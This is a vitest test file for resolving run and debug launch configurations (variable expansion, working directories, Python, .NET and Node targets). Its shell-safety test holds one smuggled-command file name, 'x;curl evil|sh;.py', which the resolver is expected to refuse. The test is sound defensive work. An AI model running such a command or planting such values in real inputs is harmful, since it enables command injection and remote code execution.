import { describe, expect, it } from 'vitest'
import { normalizeRunConfigurationDefinitions } from './run-configuration-definition'
import { resolveCommandLaunch, resolveDebugLaunch } from './run-configuration-resolve'

const context = { workspaceFolder: '/repo/wt', file: '/repo/wt/src/main.py' }

function one(entry: unknown) {
  return normalizeRunConfigurationDefinitions([entry]).configurations[0]
}

describe('resolveCommandLaunch', () => {
  it('expands variables in the command and anchors the cwd', () => {
    const config = one({
      name: 'Lint',
      command: 'ruff ${relativeFile} && echo ${HOME}',
      cwd: 'src'
    })
    expect(config.type === 'command' && resolveCommandLaunch(config, context)).toEqual({
      ok: true,
      value: { command: 'ruff src/main.py && echo ${HOME}', cwd: '/repo/wt/src' }
    })
  })

  it('defaults the cwd to the workspace', () => {
    const config = one({ name: 'Ls', command: 'ls' })
    expect(config.type === 'command' && resolveCommandLaunch(config, context)).toEqual({
      ok: true,
      value: { command: 'ls', cwd: '/repo/wt' }
    })
  })
})

describe('resolveDebugLaunch', () => {
  it('resolves target paths, args and env', () => {
    const config = one({
      name: 'Py',
      target: { kind: 'python-file', filePath: '${file}', pythonPath: '.venv/bin/python' },
      args: ['--root', '${workspaceFolder}'],
      env: { DATA: '${workspaceFolder}/data' }
    })
    expect(config.type === 'debug' && resolveDebugLaunch(config, context)).toEqual({
      ok: true,
      value: {
        target: {
          kind: 'python-file',
          filePath: '/repo/wt/src/main.py',
          pythonPath: '/repo/wt/.venv/bin/python'
        },
        cwd: '/repo/wt',
        launchOptions: { args: ['--root', '/repo/wt'], env: { DATA: '/repo/wt/data' } }
      }
    })
  })

  it('resolves .NET and Node targets', () => {
    const program = one({
      name: 'Dll',
      target: { kind: 'dotnet-program', program: 'bin/Debug/net8.0/Api.dll' },
      cwd: '${workspaceFolder}/Api'
    })
    expect(program.type === 'debug' && resolveDebugLaunch(program, context)).toEqual({
      ok: true,
      value: {
        target: { kind: 'dotnet-program', program: '/repo/wt/bin/Debug/net8.0/Api.dll' },
        cwd: '/repo/wt/Api'
      }
    })
    const script = one({
      name: 'Dev',
      target: { kind: 'node-script', packageManager: 'pnpm', script: 'dev' }
    })
    expect(script.type === 'debug' && resolveDebugLaunch(script, context)).toMatchObject({
      ok: true,
      value: { target: { kind: 'node-script', script: 'dev' }, cwd: '/repo/wt' }
    })
  })

  it('reports the variable it cannot resolve', () => {
    const config = one({ name: 'N', target: { kind: 'node-file', filePath: '${file}' } })
    expect(
      config.type === 'debug' && resolveDebugLaunch(config, { workspaceFolder: '/repo/wt' })
    ).toEqual({ ok: false, variable: '${file}' })
  })
})

describe('resolveCommandLaunch shell safety', () => {
  const command = one({ name: 'Run', command: 'python ${file}' })

  it('quotes values that only add spaces', () => {
    expect(
      command.type === 'command' &&
        resolveCommandLaunch(command, { workspaceFolder: '/w', file: '/w/my file.py' })
    ).toEqual({ ok: true, value: { command: 'python "/w/my file.py"', cwd: '/w' } })
  })

  it('refuses file names a shell would interpret', () => {
    expect(
      command.type === 'command' &&
        resolveCommandLaunch(command, { workspaceFolder: '/w', file: '/w/x;curl evil|sh;.py' })
    ).toEqual({ ok: false, variable: '${file}' })
  })
})
